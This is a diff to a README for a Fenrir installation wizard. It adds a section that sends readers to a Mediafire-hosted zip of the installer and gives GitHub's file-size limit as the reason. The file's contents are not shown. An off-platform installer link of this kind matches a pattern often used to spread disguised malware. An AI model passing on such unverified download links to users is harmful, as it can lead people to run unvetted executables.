@@ -15,6 +15,10 @@ This wizard's primary function is to **automate the installation process** for F
 
 **The goal is to provide a fast, easy, and reliable way to install Fenrir without relying on command-line expertise.**
 
+## Download the Application
+Due to Github's 25mb limit, I have to provide you with the download link via Mediafire.
+[Install Fenrir Runtime Installer](https://www.mediafire.com/file/elsyvsm3unhrfnj/Fenrir.zip/file)
+
 ## Images
 <img src="images/screenshot1.png">
 <img src="images/screenshot2.png">
